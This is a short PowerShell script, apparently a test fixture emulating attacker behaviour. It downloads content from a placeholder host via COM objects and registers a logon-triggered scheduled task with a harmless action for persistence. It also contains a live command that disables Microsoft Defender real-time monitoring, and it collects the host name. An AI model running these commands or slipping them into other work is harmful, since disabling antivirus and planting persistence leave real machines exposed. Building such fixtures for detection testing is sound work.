$http = New-Object -ComObject MSXML2.XMLHTTP
$http.Open("GET", "https://example.invalid/com", $false)
$http.Send()

$stream = New-Object -ComObject ADODB.Stream
$stream.Open()
$stream.WriteText($http.ResponseText)
$stream.SaveToFile("C:\Temp\com-response.txt", 2)

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-Command Write-Output safe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask `
    -TaskName "SafeEmulatorFixture" `
    -Action $action `
    -Trigger $trigger

Set-MpPreference -DisableRealtimeMonitoring $true

$computer = Get-ComputerInfo
Write-Output "host=$($computer.CsName)"
Write-Output "response=$(Get-Content -Raw 'C:\Temp\com-response.txt')"
